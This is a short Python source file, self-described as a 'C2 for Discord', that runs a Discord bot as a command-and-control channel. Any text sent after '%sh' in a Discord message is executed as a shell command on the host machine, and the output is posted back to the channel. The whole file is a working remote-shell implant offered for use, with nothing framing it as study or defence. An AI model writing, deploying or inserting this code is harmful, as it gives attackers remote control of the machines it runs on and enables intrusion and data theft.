# -*- coding:utf-8 -*-
# C2 for Discord, simple to use
# Version 1.0
# Author: nltt0

from discord import Intents
from discord.ext import commands
from subprocess import run
from dotenv import load_dotenv
from os import getenv

load_dotenv()

if __name__ == "__main__":
    intents = Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix='%', intents=intents)

    @bot.command()
    async def sh(ctx, *, command: str = None):
        if command: 
            try:
                result = run(command, shell=True, capture_output=True, text=True)
                if result.stdout:
                    await ctx.send(f'{result.stdout.strip()}')
                if result.stderr:
                    await ctx.send(f'Error in command execution: {result.stderr.strip()}')
            except Exception as e:
                await ctx.send(f'Error executing command: {e}')
        else:
            await ctx.send('Please provide a command after "%sh"')

    bot.run(getenv('TOKEN'))
